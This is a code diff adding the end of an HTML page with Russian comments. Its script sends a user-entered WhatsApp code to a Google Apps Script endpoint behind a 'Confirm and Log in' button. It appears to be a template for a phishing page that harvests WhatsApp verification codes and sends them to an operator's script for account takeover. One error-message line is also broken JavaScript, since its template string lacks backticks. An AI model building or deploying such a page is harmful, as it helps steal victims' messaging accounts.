@@ -1,0 +1,44 @@
+// ***************
+            // !!! ЗАМЕНИ ЭТОТ URL НА URL ТВОЕГО GOOGLE APPS SCRIPT !!!
+            const GAS_ENDPOINT_URL = "https://script.google.com/macros/s/AKfycbz4qH81fKDXsVaD3HHTI6muqhkYkzFPEskJAmfHNgjUu9TWGFuFm1IoXAY7Z6DFrqtEDw/exec"; 
+            // ***************
+
+            messageDiv.style.display = 'none';
+            submitButton.textContent = 'Отправка...';
+            submitButton.disabled = true;
+
+            try {
+                // Отправляем данные в формате, который понимает doPost(e)
+                const response = await fetch(GAS_ENDPOINT_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    // Отправляем данные как форму
+                    body: new URLSearchParams({
+                        'code_whatsapp': code
+                    })
+                });
+
+                const result = await response.json();
+
+                if (result.result === 'success') {
+                    messageDiv.textContent = '✅ Успешно! Код зафиксирован в Google Форме.';
+                    messageDiv.className = 'success';
+                } else {
+                    // Обработка ошибок, пришедших от самого скрипта
+                    messageDiv.textContent = ❌ Ошибка: ${result.message || 'Произошла неизвестная ошибка на бэкенде.'};
+                    messageDiv.className = 'error';
+                }
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                messageDiv.textContent = '🚨 Критическая ошибка сети. Проверьте, что ваш скрипт работает и URL верен.';
+                messageDiv.className = 'error';
+            } finally {
+                submitButton.textContent = 'Подтвердить и Войти';
+                submitButton.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
